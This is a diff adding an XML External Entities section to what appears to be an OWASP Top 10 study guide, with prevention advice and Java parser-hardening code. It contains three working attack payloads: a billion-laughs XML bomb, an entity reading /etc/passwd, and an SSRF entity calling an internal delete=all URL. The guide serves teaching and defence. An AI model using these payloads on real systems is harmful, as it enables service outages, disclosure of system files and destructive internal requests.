@@ -110,3 +110,70 @@ Both of these instances can cause sensitive information to be exposed to third-p
 
 - https://www.howtogeek.com/434930/why-are-companies-still-storing-passwords-in-plain-text/
 - https://www.izooto.com/blog/understanding-http-https-protocols
+
+# 4. XML External Entities (XXE)
+
+XXE is a type of attack against an application that parses XML input. It occurs when untrusted XML input containing a reference to an external entity is processed by a weakly/poorly configured XML parser. 
+This can lead to disclosure of confidential data, internal port scanning, [Server Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery), remote code execution, and [denial of service](https://owasp.org/www-community/attacks/Denial_of_Service) (DoS) attacks. 
+
+## Examples
+
+1. **Denial of Service** attack: XML Bomb, e.g. [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack). It works by flooding the XML parser with a large document and taking up memory: 
+``` xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE lolz [
+<!ENTITY lol "lol">
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+```
+2. **Disclosure of confidential data** from the server:
+``` xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+```
+3. **Server Side Request Forgery** attack:
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE updateProfile [
+<!ENTITY ssrf SYSTEM 'http://10.0.0.2/users.php?delete=all'> ]>
+<updateProfile>
+<firstname>Joe</firstname>
+<lastname>&ssrf;</lastname>
+</updateProfile>
+```
+
+## Activity
+
+Here is an interactive exercise to illustrate an example of an XXE attack:
+
+[XML Entity injection](https://application.security/free-application-security-training/owasp-top-10-xml-entity-injection)
+
+## Prevention
+
+- Configure application’s XML parsers to **disable the parsing of XML eXternal Entities (XXE) and Document Type Definitions (DTD)** when parsing XML documents. If DTDs cannot be completely disabled, developers must disable the parsing of external general entities and external parameter entities when parsing untrusted XML files. e.g.:
+``` Java
+XMLReader reader = XMLReaderFactory.createXMLReader();
+reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
+reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+```
+- Use less complex data formats e.g JSON whenever possible
+- Patch or upgrade all XML processors and libraries in use by the application or on the underlying operating system
+
+**More resources:**
+
+- https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_(XXE)
+- https://portswigger.net/web-security/xxe
+- https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
